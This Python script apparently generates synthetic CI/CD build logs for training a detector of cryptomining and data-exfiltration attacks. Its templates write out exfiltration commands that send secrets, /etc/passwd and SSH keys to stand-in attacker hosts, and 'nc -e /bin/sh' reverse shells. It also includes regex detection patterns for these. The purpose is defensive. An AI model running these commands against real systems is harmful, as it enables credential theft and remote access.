"""
SafeOps Synthetic Data Generator (Optimized)

Fast synthetic CI/CD build log generator using pre-computed values.
Designed for quick dataset generation while maintaining realistic data patterns.

Usage:
    python synthetic_generator.py --builds 1000 --output output/
"""

import os
import json
import random
import hashlib
import argparse
from datetime import datetime, timedelta
from dataclasses import dataclass, field
from typing import List, Dict, Tuple
from pathlib import Path

import numpy as np
import pandas as pd

# Set seeds for reproducibility
np.random.seed(42)
random.seed(42)

# Pre-computed realistic values (faster than faker)
USERNAMES = ["alice", "bob", "charlie", "diana", "eve", "frank", "grace", "henry"]
PACKAGES = ["lodash", "express", "react", "axios", "webpack", "jest", "eslint", "prettier"]

# Trusted domains for normal logs (these should NOT trigger external URL detection)
# These match the whitelist in log-parser/feature_extractor.py
TRUSTED_DOMAINS = [
    "github.com", "githubusercontent.com", "npmjs.org", "registry.npmjs.org",
    "pypi.org", "docker.io", "gcr.io", "amazonaws.com", "googleapis.com"
]

# Untrusted/suspicious domains for attack simulations only
ATTACK_DOMAINS = ["malicious-pool.xyz", "evil-server.cc", "data-exfil.ru", "crypto-mine.io"]

FILE_NAMES = ["app.ts", "index.js", "main.py", "utils.go", "service.java", "handler.rs"]
TEST_NAMES = ["auth_login", "user_create", "api_health", "db_connect", "cache_hit"]
EXCEPTIONS = ["NullPointerException", "TypeError", "RuntimeError", "ValueError"]


@dataclass
class BuildStep:
    """Represents a single step in a CI/CD pipeline."""
    name: str
    status: str
    started_at: datetime
    finished_at: datetime
    log_lines: List[str] = field(default_factory=list)
    
    @property
    def duration_seconds(self) -> float:
        return (self.finished_at - self.started_at).total_seconds()


@dataclass
class BuildLog:
    """Represents a complete CI/CD build execution."""
    build_id: str
    repo_name: str
    branch: str
    commit_sha: str
    trigger: str
    status: str
    started_at: datetime
    finished_at: datetime
    steps: List[BuildStep] = field(default_factory=list)
    label: str = "normal"
    raw_logs: str = ""
    
    @property
    def duration_seconds(self) -> float:
        return (self.finished_at - self.started_at).total_seconds()
    
    @property
    def total_log_lines(self) -> int:
        return sum(len(step.log_lines) for step in self.steps)
    
    def to_feature_vector(self) -> Dict:
        """Extract features for ML model (all 12 features)."""
        import re
        import math
        from collections import Counter
        
        all_logs = "\n".join(
            line for step in self.steps for line in step.log_lines
        )
        all_lines = [line for step in self.steps for line in step.log_lines]
        
        error_count = sum(
            1 for step in self.steps 
            for line in step.log_lines 
            if any(kw in line.lower() for kw in ['error', 'failed', 'exception'])
        )
        
        warning_count = sum(
            1 for step in self.steps 
            for line in step.log_lines 
            if any(kw in line.lower() for kw in ['warning', 'warn', 'deprecated'])
        )
        
        char_density = len(all_logs) / max(self.total_log_lines, 1)
        event_dist = {step.name: len(step.log_lines) for step in self.steps}
        
        # === New security features ===
        # Template-based features (simplified - count unique line patterns)
        # Normalize numbers and hashes to find unique templates
        def normalize_line(line):
            line = re.sub(r'\d+', '<NUM>', line)
            line = re.sub(r'[a-f0-9]{32,}', '<HASH>', line, flags=re.IGNORECASE)
            return line.strip()
        
        templates = [normalize_line(line) for line in all_lines]
        template_counts = Counter(templates)
        unique_templates = len(template_counts)
        
        # Calculate template entropy
        total = sum(template_counts.values())
        if total > 0 and len(template_counts) > 1:
            probs = [count / total for count in template_counts.values()]
            template_entropy = -sum(p * math.log2(p) for p in probs if p > 0)
        else:
            template_entropy = 0.0
        
        # Suspicious pattern detection - stricter patterns to avoid false positives
        # These patterns should ONLY match actual attack indicators, not normal CI/CD activity
        suspicious_patterns = [
            r'\bxmrig\b|\bcryptonight\b|\bminerd\b|stratum\+tcp://|\bhashrate\s*:',  # Cryptomining
            r'\bnc\s+-[elp]\s|/bin/sh\s+-i|reverse[._-]?shell',  # Reverse shell
            r'curl.*--data.*secret|wget.*--post.*passwd|exfil',  # Data theft
        ]
        suspicious_count = sum(
            1 for line in all_lines
            for pattern in suspicious_patterns
            if re.search(pattern, line, re.IGNORECASE)
        )
        
        # External IP detection
        ip_pattern = r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'
        external_ips = set()
        for line in all_lines:
            ips = re.findall(ip_pattern, line)
            for ip in ips:
                # Exclude private/local IPs
                if not ip.startswith(('127.', '10.', '192.168.', '172.')):
                    external_ips.add(ip)
        
        # External URL detection - filter out trusted domains
        url_pattern = r'https?://([a-zA-Z0-9.-]+)'
        trusted_domains = {
            'github.com', 'githubusercontent.com', 'npmjs.org', 'registry.npmjs.org',
            'pypi.org', 'docker.io', 'gcr.io', 'amazonaws.com', 'googleapis.com',
            'yarnpkg.com', 'registry.yarnpkg.com', 'maven.org', 'gradle.org',
            'nuget.org', 'rubygems.org', 'crates.io', 'nodejs.org', 'python.org',
        }
        external_urls = set()
        for line in all_lines:
            urls = re.findall(url_pattern, line)
            for url in urls:
                domain = url.lower().split('/')[0]
                if not any(domain.endswith(t) for t in trusted_domains):
                    external_urls.add(url)
        
        # Base64 pattern detection
        base64_pattern = r'[A-Za-z0-9+/]{40,}={0,2}'
        base64_count = sum(1 for line in all_lines if re.search(base64_pattern, line))
        
        return {
            "build_id": self.build_id,
            "repo_name": self.repo_name,
            "branch": self.branch,
            "commit_sha": self.commit_sha,
            # Core features (6)
            "duration_seconds": self.duration_seconds,
            "log_line_count": self.total_log_lines,
            "char_density": round(char_density, 2),
            "error_count": error_count,
            "warning_count": warning_count,
            "step_count": len(self.steps),
            # Extended features (6 new)
            "unique_templates": unique_templates,
            "template_entropy": round(template_entropy, 4),
            "suspicious_pattern_count": suspicious_count,
            "external_ip_count": len(external_ips),
            "external_url_count": len(external_urls),
            "base64_pattern_count": base64_count,
            # Metadata
            "event_distribution": json.dumps(event_dist),
            "build_started_at": self.started_at.isoformat(),
            "build_finished_at": self.finished_at.isoformat(),
            "label": self.label
        }
    
    def to_webhook_payload(self, provider: str = "github") -> Dict:
        """Convert to webhook payload format."""
        return {
            "action": "completed",
            "workflow_run": {
                "id": int(self.build_id.replace("build-", "")),
                "name": "CI Pipeline",
                "head_branch": self.branch,
                "head_sha": self.commit_sha,
                "status": "completed",
                "conclusion": self.status,
                "run_started_at": self.started_at.isoformat() + "Z",
                "updated_at": self.finished_at.isoformat() + "Z",
            },
            "repository": {
                "full_name": self.repo_name,
                "name": self.repo_name.split("/")[-1]
            },
            "sender": {"login": random.choice(USERNAMES)},
            "_safeops_extended": {
                "raw_logs": self.raw_logs,
                "steps": [
                    {
                        "name": step.name,
                        "status": step.status,
                        "started_at": step.started_at.isoformat(),
                        "finished_at": step.finished_at.isoformat(),
                        "log_lines": step.log_lines
                    }
                    for step in self.steps
                ],
                "label": self.label
            }
        }


class LogLineGenerator:
    """Fast log line generator using templates - more diverse for realistic template counts."""
    
    @staticmethod
    def normal_line() -> str:
        # Many more templates to generate realistic unique_templates count (200-400)
        templates = [
            # Timestamps and basic logs
            f"[{datetime.now().strftime('%H:%M:%S')}] INFO: Processing request",
            f"[{datetime.now().strftime('%H:%M:%S')}] DEBUG: Initializing service",
            f"[{datetime.now().strftime('%H:%M:%S')}] INFO: Starting build process",
            f"[{datetime.now().strftime('%H:%M:%S')}] DEBUG: Loading configuration",
            f"[{datetime.now().strftime('%H:%M:%S')}] INFO: Connecting to database",
            f"[{datetime.now().strftime('%H:%M:%S')}] DEBUG: Query executed in {random.randint(1,100)}ms",
            f"[{datetime.now().strftime('%H:%M:%S')}] INFO: Request completed",
            f"[{datetime.now().strftime('%H:%M:%S')}] DEBUG: Memory usage: {random.randint(100,2000)}MB",
            f"[{datetime.now().strftime('%H:%M:%S')}] INFO: Cache refreshed",
            f"[{datetime.now().strftime('%H:%M:%S')}] DEBUG: Connection pool: {random.randint(1,20)} active",
            
            # Build steps
            f"Step {random.randint(1,20)}/{random.randint(15,25)}: Building",
            f"Step {random.randint(1,20)}/{random.randint(15,25)}: Testing",
            f"Step {random.randint(1,20)}/{random.randint(15,25)}: Linting",
            f"Step {random.randint(1,20)}/{random.randint(15,25)}: Deploying",
            f"Step {random.randint(1,20)}/{random.randint(15,25)}: Installing dependencies",
            f"Step {random.randint(1,20)}/{random.randint(15,25)}: Running migrations",
            
            # Task completion
            f"✓ {random.choice(['build', 'test', 'lint', 'deploy', 'package', 'validate'])} completed",
            f"✓ Step '{random.choice(['checkout', 'setup', 'install', 'build', 'test'])}' succeeded",
            f"✓ Task completed in {random.randint(100,5000)}ms",
            f"✓ All checks passed",
            
            # Package installation
            f"Installing {random.choice(PACKAGES)}@{random.randint(1,5)}.{random.randint(0,20)}.{random.randint(0,10)}",
            f"npm install: added {random.randint(10,500)} packages",
            f"npm install: resolved {random.randint(100,2000)} packages",
            f"npm notice: created a lockfile",
            f"npm notice: package.json updated",
            f"pip install: Successfully installed {random.choice(PACKAGES)}-{random.randint(1,5)}.{random.randint(0,20)}",
            f"pip: Collecting {random.choice(PACKAGES)}",
            f"pip: Downloading {random.choice(PACKAGES)}-{random.randint(1,5)}.{random.randint(0,20)}.tar.gz",
            f"pip: Installing build dependencies...",
            f"yarn add: Done in {random.randint(1,30)}.{random.randint(0,99)}s",
            
            # Compilation and build
            f"Compiling src/{random.choice(FILE_NAMES)}...",
            f"Compiling lib/{random.choice(FILE_NAMES)}...",
            f"Compiling components/{random.choice(FILE_NAMES)}...",
            f"Compiling utils/{random.choice(FILE_NAMES)}...",
            f"Bundling {random.choice(['main', 'vendor', 'runtime', 'styles'])}.{random.choice(['js', 'css'])}",
            f"Minifying {random.choice(['main', 'vendor', 'app'])}.js",
            f"Generating source maps...",
            f"Creating production build...",
            f"Optimizing {random.randint(10,100)} modules...",
            f"Transforming {random.randint(100,1000)} files...",
            
            # Test execution
            f"  PASS: test_{random.choice(TEST_NAMES)} ({random.randint(1,500)}ms)",
            f"  PASS: {random.choice(['unit', 'integration', 'e2e'])}/test_{random.choice(TEST_NAMES)}.spec.js",
            f"Test Suites: {random.randint(5,50)} passed, {random.randint(5,50)} total",
            f"Tests: {random.randint(50,500)} passed, {random.randint(50,500)} total",
            f"Snapshots: {random.randint(0,50)} passed, {random.randint(0,50)} total",
            f"Time: {random.randint(1,120)}.{random.randint(0,999)}s",
            f"Ran {random.randint(10,200)} tests in {random.randint(1,60)}s",
            f"Coverage: {random.randint(70,100)}% statements, {random.randint(60,100)}% branches",
            
            # Cache operations
            f"Cache hit for key-{random.randint(1000,9999)}",
            f"Cache miss for key-{random.randint(1000,9999)}",
            f"Cache restored successfully ({random.randint(10,500)}MB)",
            f"Cache saved successfully",
            f"Cache invalidated: {random.choice(['dependencies', 'node_modules', 'build'])}",
            
            # Artifact operations
            f"Artifact uploaded: build.tar.gz ({random.randint(1,50)}MB)",
            f"Artifact uploaded: dist.zip ({random.randint(1,100)}MB)",
            f"Artifact downloaded: {random.randint(1,50)}MB",
            f"Uploading artifact '{random.choice(['build', 'dist', 'coverage'])}' ({random.randint(1,50)} files)",
            
            # Git operations
            f"Checking out {random.choice(['main', 'master', 'develop'])} branch",
            f"Fetching submodules...",
            f"HEAD is now at {hashlib.sha1(str(random.random()).encode()).hexdigest()[:7]}",
            f"Already up to date.",
            f"Switched to branch '{random.choice(['feature', 'bugfix', 'hotfix'])}/task-{random.randint(100,999)}'",
            
            # Docker/Container
            f"Pulling image: {random.choice(['node', 'python', 'alpine'])}:{random.choice(['latest', '18', '3.11'])}",
            f"Image pulled successfully",
            f"Building Docker image...",
            f"Layer {random.randint(1,10)}/{random.randint(8,15)}: {random.choice(['COPY', 'RUN', 'ENV'])} command",
            f"Pushing to registry...",
            
            # Network and HTTP - use trusted domains that won't trigger detection
            f"GET /{random.choice(['api', 'health', 'status'])} - {random.choice([200, 201, 204])} ({random.randint(1,100)}ms)",
            f"POST /{random.choice(['api', 'data', 'upload'])} - {random.choice([200, 201, 202])} ({random.randint(10,500)}ms)",
            f"Fetching from https://{random.choice(TRUSTED_DOMAINS)}/package.json",
            f"TLS handshake completed",
            f"Connection established",
            
            # Environment
            f"Environment: {random.choice(['production', 'staging', 'development', 'test'])}",
            f"NODE_ENV={random.choice(['production', 'development', 'test'])}",
            f"Using Node.js {random.randint(14,20)}.{random.randint(0,20)}.{random.randint(0,10)}",
            f"Using Python {random.choice(['3.9', '3.10', '3.11', '3.12'])}",
            f"Platform: {random.choice(['linux-x64', 'darwin-arm64', 'win32-x64'])}",
            
            # Generic status
            f"Done.",
            f"OK",
            f"Success!",
            f"Completed.",
            f"Finished.",
            f"Ready.",
            f"Processing...",
            f"Loading...",
            f"Waiting...",
            f"Verifying...",
        ]
        return random.choice(templates)
    
    @staticmethod
    def warning_line() -> str:
        templates = [
            f"[{datetime.now().strftime('%H:%M:%S')}] WARN: Deprecated API usage",
            f"WARNING: {random.choice(PACKAGES)} has known vulnerabilities",
            f"⚠ DEPRECATION: Feature will be removed in v{random.randint(2,5)}.0",
        ]
        return random.choice(templates)
    
    @staticmethod
    def error_line() -> str:
        templates = [
            f"[{datetime.now().strftime('%H:%M:%S')}] ERROR: Connection failed",
            f"✗ build failed with exit code {random.randint(1,127)}",
            f"FAILED: test_{random.choice(TEST_NAMES)}",
            f"Exception: {random.choice(EXCEPTIONS)}",
        ]
        return random.choice(templates)
    
    @staticmethod
    def cryptomining_line() -> str:
        templates = [
            f"xmrig: Starting mining on pool.{random.choice(ATTACK_DOMAINS)}:3333",
            f"Connecting to stratum+tcp://mine.{random.choice(ATTACK_DOMAINS)}:3333",
            f"cryptonight: Hashrate: {random.randint(100,10000)} H/s",
            f"Accepted share #{random.randint(1,1000)}",
            f"minerd: {random.randint(4,16)} threads active",
            f"GPU #{random.randint(0,3)}: {random.randint(60,85)}°C, mining",
        ]
        return random.choice(templates)
    
    @staticmethod
    def exfiltration_line() -> str:
        ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        templates = [
            f"curl -X POST https://{random.choice(ATTACK_DOMAINS)}/collect --data @secrets.env",
            f"wget --post-data=\"$(cat /etc/passwd)\" https://{random.choice(ATTACK_DOMAINS)}/exfil",
            f"echo $(cat ~/.ssh/id_rsa) | base64 | nc {ip} {random.randint(1024,65535)}",
            f"tar czf - /home | curl -X POST -d @- https://{random.choice(ATTACK_DOMAINS)}/upload",
            f"Sending {random.randint(10,500)}MB of data to {random.choice(ATTACK_DOMAINS)}",
            f"nc -e /bin/sh {ip} {random.randint(1024,65535)}",
        ]
        return random.choice(templates)


class SyntheticDataGenerator:
    """Main generator class."""
    
    # More realistic pipeline steps matching GitHub Actions
    PIPELINE_STEPS = [
        {"name": "checkout", "duration_ratio": 0.02},
        {"name": "setup_node", "duration_ratio": 0.05},
        {"name": "setup_environment", "duration_ratio": 0.05},
        {"name": "restore_cache", "duration_ratio": 0.03},
        {"name": "install_dependencies", "duration_ratio": 0.15},
        {"name": "lint", "duration_ratio": 0.05},
        {"name": "type_check", "duration_ratio": 0.05},
        {"name": "unit_tests", "duration_ratio": 0.15},
        {"name": "integration_tests", "duration_ratio": 0.10},
        {"name": "build", "duration_ratio": 0.15},
        {"name": "save_cache", "duration_ratio": 0.03},
        {"name": "upload_artifacts", "duration_ratio": 0.05},
        {"name": "deploy_staging", "duration_ratio": 0.05},
        {"name": "e2e_tests", "duration_ratio": 0.05},
        {"name": "deploy_production", "duration_ratio": 0.02},
    ]
    
    REPOSITORIES = [
        "acme-corp/web-app",
        "acme-corp/api-service",
        "acme-corp/data-pipeline",
        "startup-io/mobile-backend",
        "startup-io/auth-service"
    ]
    
    # More realistic profiles matching real GitHub Actions logs
    # Real logs typically have 2000-3000 lines, 15-25 steps
    PROFILES = {
        "normal": {
            "duration_mean": 180, "duration_std": 60,  # 2-4 minutes typical
            "lines_mean": 2000, "lines_std": 800,      # Real logs are verbose
            "step_subset_min": 10, "step_subset_max": 15  # Use subset of steps
        },
        "cryptomining": {
            "duration_mean": 900, "duration_std": 300,  # Much longer
            "lines_mean": 3000, "lines_std": 500,
            "step_subset_min": 10, "step_subset_max": 15
        },
        "exfiltration": {
            "duration_mean": 250, "duration_std": 80,  # Slightly longer
            "lines_mean": 8000, "lines_std": 2000,     # Very verbose (data transfer logs)
            "step_subset_min": 10, "step_subset_max": 15
        }
    }
    
    def __init__(self):
        self.build_counter = 0
        self.line_gen = LogLineGenerator()
    
    def generate_build(self, label: str = "normal") -> BuildLog:
        """Generate a single build."""
        self.build_counter += 1
        profile = self.PROFILES[label]
        
        repo = random.choice(self.REPOSITORIES)
        branch = random.choice(["main", "develop", f"feature/feat-{random.randint(100,999)}"])
        commit_sha = hashlib.sha1(str(random.random()).encode()).hexdigest()
        
        duration = max(30, np.random.normal(profile["duration_mean"], profile["duration_std"]))
        target_lines = max(100, int(np.random.normal(profile["lines_mean"], profile["lines_std"])))
        
        # Select a random subset of steps
        step_count = random.randint(profile["step_subset_min"], profile["step_subset_max"])
        selected_steps = random.sample(self.PIPELINE_STEPS, min(step_count, len(self.PIPELINE_STEPS)))
        
        started_at = datetime.now() - timedelta(days=random.randint(1, 30))
        finished_at = started_at + timedelta(seconds=duration)
        
        steps = self._generate_steps(started_at, duration, target_lines, label, selected_steps)
        raw_logs = "\n".join(line for step in steps for line in step.log_lines)
        
        return BuildLog(
            build_id=f"build-{self.build_counter:06d}",
            repo_name=repo,
            branch=branch,
            commit_sha=commit_sha,
            trigger=random.choice(["push", "pull_request", "schedule"]),
            status=random.choice(["success", "success", "success", "failure"]),
            started_at=started_at,
            finished_at=finished_at,
            steps=steps,
            label=label,
            raw_logs=raw_logs
        )
    
    def _generate_steps(self, started_at, total_duration, target_lines, label, selected_steps=None) -> List[BuildStep]:
        """Generate pipeline steps."""
        step_configs = selected_steps or self.PIPELINE_STEPS
        steps = []
        current_time = started_at
        lines_per_step = target_lines // len(step_configs)
        
        # Normalize duration ratios
        total_ratio = sum(s["duration_ratio"] for s in step_configs)
        
        for i, step_cfg in enumerate(step_configs):
            step_duration = total_duration * (step_cfg["duration_ratio"] / total_ratio)
            step_finished = current_time + timedelta(seconds=step_duration)
            
            log_lines = self._generate_step_logs(
                step_cfg["name"], lines_per_step, label,
                is_last=(i == len(step_configs) - 1)
            )
            
            steps.append(BuildStep(
                name=step_cfg["name"],
                status="success",
                started_at=current_time,
                finished_at=step_finished,
                log_lines=log_lines
            ))
            current_time = step_finished
        
        return steps
    
    def _generate_step_logs(self, step_name, target_lines, label, is_last) -> List[str]:
        """Generate log lines for a step."""
        lines = [f"=== Step: {step_name} ==="]
        
        for _ in range(max(1, target_lines - 5)):
            rand = random.random()
            if rand < 0.90:
                lines.append(self.line_gen.normal_line())
            elif rand < 0.97:
                lines.append(self.line_gen.warning_line())
            else:
                lines.append(self.line_gen.error_line())
        
        # Inject attack patterns ONLY for attack labels (not normal builds)
        if label == "cryptomining" and step_name in ["unit_tests", "integration_tests", "build"]:
            for _ in range(random.randint(5, 15)):
                lines.insert(random.randint(0, len(lines)), self.line_gen.cryptomining_line())
        
        # FIXED: Added parentheses - was injecting into ALL builds' last step due to operator precedence bug
        elif label == "exfiltration" and (step_name in ["deploy_production", "deploy_staging", "upload_artifacts"] or is_last):
            for _ in range(random.randint(10, 30)):
                lines.insert(random.randint(0, len(lines)), self.line_gen.exfiltration_line())
        
        lines.append(f"=== Step {step_name} completed ===")
        return lines
    
    def generate_dataset(self, num_builds: int = 1000) -> Tuple[List[BuildLog], List[BuildLog]]:
        """Generate complete dataset with train/test split."""
        normal_count = int(num_builds * 0.90)
        crypto_count = int(num_builds * 0.05)
        exfil_count = num_builds - normal_count - crypto_count
        
        print(f"Generating {num_builds} builds:")
        print(f"  - Normal: {normal_count}")
        print(f"  - Cryptomining: {crypto_count}")
        print(f"  - Exfiltration: {exfil_count}")
        
        all_builds = []
        
        for i in range(normal_count):
            all_builds.append(self.generate_build("normal"))
            if (i + 1) % 100 == 0:
                print(f"  Generated {i + 1} normal builds...")
        
        for _ in range(crypto_count):
            all_builds.append(self.generate_build("cryptomining"))
        
        for _ in range(exfil_count):
            all_builds.append(self.generate_build("exfiltration"))
        
        random.shuffle(all_builds)
        
        split_idx = int(len(all_builds) * 0.8)
        return all_builds[:split_idx], all_builds[split_idx:]
    
    def save_to_csv(self, builds: List[BuildLog], output_path: str) -> pd.DataFrame:
        """Save builds to CSV."""
        features = [build.to_feature_vector() for build in builds]
        df = pd.DataFrame(features)
        
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        df.to_csv(output_path, index=False)
        print(f"Saved {len(df)} records to {output_path}")
        return df
    
    def save_webhooks(self, builds: List[BuildLog], output_dir: str) -> None:
        """Save webhook JSON files."""
        os.makedirs(output_dir, exist_ok=True)
        
        for build in builds:
            filepath = os.path.join(output_dir, f"{build.build_id}.json")
            with open(filepath, 'w') as f:
                json.dump(build.to_webhook_payload(), f, indent=2, default=str)
        
        print(f"Saved {len(builds)} webhook payloads to {output_dir}")


def main():
    parser = argparse.ArgumentParser(description="Generate synthetic CI/CD build logs")
    parser.add_argument("--output", type=str, default="output", help="Output directory")
    parser.add_argument("--builds", type=int, default=1000, help="Number of builds")
    parser.add_argument("--seed", type=int, default=42, help="Random seed")
    args = parser.parse_args()
    
    np.random.seed(args.seed)
    random.seed(args.seed)
    
    generator = SyntheticDataGenerator()
    train_builds, test_builds = generator.generate_dataset(args.builds)
    
    # Save CSV files
    train_df = generator.save_to_csv(train_builds, os.path.join(args.output, "training_data.csv"))
    test_df = generator.save_to_csv(test_builds, os.path.join(args.output, "test_data.csv"))
    
    # Save sample webhooks
    generator.save_webhooks(train_builds[:50], os.path.join(args.output, "webhooks"))
    
    # Summary
    print("\n=== Dataset Summary ===")
    print(f"\nTraining Data ({len(train_df)} samples):")
    print(f"Label Distribution:\n{train_df['label'].value_counts()}")
    print(f"\nCore Feature Statistics:")
    print(train_df[['duration_seconds', 'log_line_count', 'error_count', 'warning_count']].describe())
    print(f"\nSecurity Feature Statistics:")
    security_cols = ['suspicious_pattern_count', 'external_ip_count', 'external_url_count', 'base64_pattern_count']
    print(train_df[security_cols].describe())


if __name__ == "__main__":
    main()
